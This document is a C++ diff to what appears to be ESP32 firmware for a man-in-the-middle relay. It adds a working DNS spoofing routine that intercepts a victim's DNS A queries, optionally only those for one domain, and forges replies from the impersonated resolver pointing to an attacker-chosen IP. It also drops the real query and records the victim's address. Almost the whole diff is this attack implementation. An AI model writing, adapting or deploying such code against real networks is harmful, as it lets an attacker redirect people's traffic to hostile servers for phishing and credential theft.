@@ -42,6 +42,162 @@ volatile bool  MitmRelay::_captureS   = false;
 MitmRelay::CaptureFilter MitmRelay::_captureFilter = nullptr;
 MitmRelay::PreviewSink   MitmRelay::_previewSink   = nullptr;
 char           MitmRelay::_errBuf[48] = {};
+volatile bool     MitmRelay::_dnsSpoofS      = false;
+volatile uint32_t MitmRelay::_dnsRedirectIpS = 0;
+char              MitmRelay::_dnsDomainS[64] = {};
+volatile uint32_t MitmRelay::_dnsHits        = 0;
+volatile uint32_t MitmRelay::_dnsLastClient  = 0;
+
+void MitmRelay::setDnsSpoof(bool on, uint32_t redirectIpNet, const char* domain) {
+  _dnsSpoofS      = on;
+  _dnsRedirectIpS = redirectIpNet;
+  // Store the filter case-folded so the per-query compare is a plain memcmp.
+  // Leading/trailing dots are trimmed so "example.com", ".example.com." and
+  // "example.com." all behave the same.
+  _dnsDomainS[0] = '\0';
+  if (domain && *domain) {
+    size_t w = 0;
+    for (const char* s = domain; *s && w < sizeof(_dnsDomainS) - 1; ++s) {
+      char c = *s;
+      if (c >= 'A' && c <= 'Z') c += 32;
+      _dnsDomainS[w++] = c;
+    }
+    _dnsDomainS[w] = '\0';
+    while (w && _dnsDomainS[w - 1] == '.') _dnsDomainS[--w] = '\0';   // trailing dots
+    size_t lead = 0;
+    while (_dnsDomainS[lead] == '.') ++lead;                          // leading dots
+    if (lead) memmove(_dnsDomainS, _dnsDomainS + lead, w - lead + 1);
+  }
+}
+
+// Answer a transit DNS A/IN query from a poisoned host with the configured
+// redirect IP, in the RX hook, and consume the query so it never reaches the
+// real resolver. Only a small reply packet is forged in a static buffer and
+// re-transmitted on the existing TX path — deliberately no web server, so this
+// does not reintroduce the heap exhaustion that removed the old portal DNS
+// toggle (see the header comment). Returns true when it handled + freed the
+// frame; false leaves it for normal forwarding (non-UDP, non-:53, non-A, or
+// malformed — so the victim keeps resolving everything else).
+bool MitmRelay::_tryDnsSpoof(uint8_t* eth, uint16_t len, void* eb) {
+  if (len < 14 + 20 + 8 + 12) return false;
+  const uint8_t* ip  = eth + 14;
+  const uint8_t  ihl = (ip[0] & 0x0F) * 4;
+  if (ihl < 20 || (int)len < 14 + ihl + 8 + 12) return false;
+  if (ip[9] != 17) return false;                        // not UDP
+  const uint8_t* udp = eth + 14 + ihl;
+  const uint16_t dport = ((uint16_t)udp[2] << 8) | udp[3];
+  if (dport != 53) return false;                        // not DNS
+  const uint8_t* dns = udp + 8;
+  const int dnsLen = (int)len - (14 + ihl + 8);
+  if (dnsLen < 12) return false;
+  if ((dns[2] & 0x80) != 0) return false;               // already a response
+  const uint16_t qd = ((uint16_t)dns[4] << 8) | dns[5];
+  if (qd < 1) return false;
+
+  // Walk the first QNAME to find QTYPE/QCLASS.
+  int p = 12;
+  while (p < dnsLen) {
+    const uint8_t l = dns[p];
+    if (l == 0) { p++; break; }
+    if ((l & 0xC0) == 0xC0) { p += 2; break; }          // compression (unexpected in a query)
+    p += 1 + l;
+    if (p > dnsLen) return false;
+  }
+  if (p + 4 > dnsLen) return false;
+  const uint16_t qtype  = ((uint16_t)dns[p] << 8) | dns[p + 1];
+  const uint16_t qclass = ((uint16_t)dns[p + 2] << 8) | dns[p + 3];
+  const int qEnd = p + 4;                               // end of the first question
+  if (qtype != 1 || qclass != 1) return false;          // only A / IN
+
+  // Domain filter: when one is set, reconstruct the queried name (case-folded,
+  // labels joined by dots) and keep going only if it is the configured domain
+  // or a subdomain of it. Anything else returns false → forwarded untouched, so
+  // the victim resolves every other name normally.
+  if (_dnsDomainS[0]) {
+    char qname[256];
+    int qn = 0;
+    for (int i = 12; i < dnsLen; ) {
+      const uint8_t l = dns[i];
+      if (l == 0) break;
+      if ((l & 0xC0) == 0xC0) { qn = 0; break; }        // compression: bail, no match
+      if (i + 1 + l > dnsLen) return false;
+      if (qn && qn < (int)sizeof(qname) - 1) qname[qn++] = '.';
+      for (uint8_t k = 0; k < l && qn < (int)sizeof(qname) - 1; ++k) {
+        char c = (char)dns[i + 1 + k];
+        if (c >= 'A' && c <= 'Z') c += 32;
+        qname[qn++] = c;
+      }
+      i += 1 + l;
+    }
+    qname[qn] = '\0';
+    const int dl = (int)strlen(_dnsDomainS);
+    const bool exact  = qn == dl && memcmp(qname, _dnsDomainS, dl) == 0;
+    const bool suffix = qn >  dl && qname[qn - dl - 1] == '.' &&
+                        memcmp(qname + qn - dl, _dnsDomainS, dl) == 0;
+    if (!exact && !suffix) return false;
+  }
+
+  static constexpr int MAXF = 576;                      // typical DNS fits easily
+  const int ansLen     = 16;                            // ptr+type+class+ttl+rdlen+rdata
+  const int dnsRespLen = qEnd + ansLen;
+  const int frameLen   = 14 + ihl + 8 + dnsRespLen;
+  if (frameLen > MAXF) return false;
+
+  // Only the WiFi task calls the RX hook, so a static scratch frame is safe and
+  // keeps this heavy-ish forge off the callback stack.
+  static uint8_t out[MAXF];
+  memcpy(out, eth, 14 + ihl + 8 + qEnd);                // eth + ip + udp + dns(header+question)
+
+  uint8_t* oIp  = out + 14;
+  uint8_t* oUdp = out + 14 + ihl;
+  uint8_t* oDns = oUdp + 8;
+
+  // DNS → response with one answer.
+  oDns[2] = 0x81; oDns[3] = 0x80;                        // QR=1, RD=1, RA=1, RCODE=0
+  oDns[6] = 0x00; oDns[7] = 0x01;                        // ANCOUNT = 1
+  oDns[8] = oDns[9] = oDns[10] = oDns[11] = 0x00;        // NSCOUNT = ARCOUNT = 0
+  uint8_t* a = oDns + qEnd;
+  a[0] = 0xC0; a[1] = 0x0C;                              // NAME → pointer to offset 12
+  a[2] = 0x00; a[3] = 0x01;                              // TYPE A
+  a[4] = 0x00; a[5] = 0x01;                              // CLASS IN
+  a[6] = 0; a[7] = 0; a[8] = 0; a[9] = 60;               // TTL 60s
+  a[10] = 0; a[11] = 4;                                  // RDLENGTH 4
+  memcpy(a + 12, (const void*)&_dnsRedirectIpS, 4);      // RDATA (network order)
+
+  // Ethernet: reply goes back to the victim.
+  memcpy(out + 0, eth + 6, 6);                           // dst = victim (orig src)
+  memcpy(out + 6, _selfMac, 6);                          // src = us
+
+  // IPv4: swap src/dst, set length and TTL, recompute header checksum.
+  const uint16_t ipTotal = ihl + 8 + dnsRespLen;
+  oIp[2] = ipTotal >> 8; oIp[3] = ipTotal & 0xFF;
+  oIp[8] = 64;                                           // TTL
+  uint8_t tmp4[4];
+  memcpy(tmp4, ip + 12, 4);                              // orig src IP
+  memcpy(oIp + 12, ip + 16, 4);                          // new src = orig dst (resolver)
+  memcpy(oIp + 16, tmp4, 4);                             // new dst = orig src (victim)
+  oIp[10] = oIp[11] = 0;
+  uint32_t sum = 0;
+  for (int i = 0; i < ihl; i += 2) sum += ((uint32_t)oIp[i] << 8) | oIp[i + 1];
+  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+  const uint16_t cks = ~sum;
+  oIp[10] = cks >> 8; oIp[11] = cks & 0xFF;
+
+  // UDP: swap ports, set length, drop checksum (0 = not computed, valid for IPv4).
+  const uint16_t udpLen = 8 + dnsRespLen;
+  uint8_t tmp2[2];
+  memcpy(tmp2, udp, 2);                                  // orig src port
+  memcpy(oUdp + 0, udp + 2, 2);                          // new src = orig dst (53)
+  memcpy(oUdp + 2, tmp2, 2);                             // new dst = orig src
+  oUdp[4] = udpLen >> 8; oUdp[5] = udpLen & 0xFF;
+  oUdp[6] = oUdp[7] = 0;
+
+  esp_wifi_internal_tx(WIFI_IF_STA, out, frameLen);
+  esp_wifi_internal_free_rx_buffer(eb);
+  _dnsHits++;
+  { uint32_t c; memcpy(&c, ip + 12, 4); _dnsLastClient = c; }   // victim (orig src IP)
+  return true;
+}
 
 // ── Ring ────────────────────────────────────────────────────────────────────
 
@@ -146,6 +302,8 @@ bool MitmRelay::begin(Mode mode) {
   _captured = _dropped = _forwarded = _txFailed = 0;
   _loopDropped = 0;
   _seen        = 0;
+  _dnsHits     = 0;
+  _dnsLastClient = 0;
   _lastHook    = millis();
   _storageFailed = false;
   _lastFlush     = millis();
@@ -379,6 +537,10 @@ esp_err_t MitmRelay::_rxCb(void* buffer, uint16_t len, void* eb) {
   // would loop it straight back onto the same link.
   if (_forwardS && _active && toUs && !groupAddr && !fromUs &&
       etherType == 0x0800 && len >= 14 + 20) {
+
+    // DNS spoof: answer the victim's A query ourselves and drop it, so it never
+    // reaches the real resolver. Done before the forwarding decision below.
+    if (_dnsSpoofS && _tryDnsSpoof(eth, len, eb)) return ESP_OK;
 
     const uint8_t* ip = eth + 14;
     uint32_t dstIp;
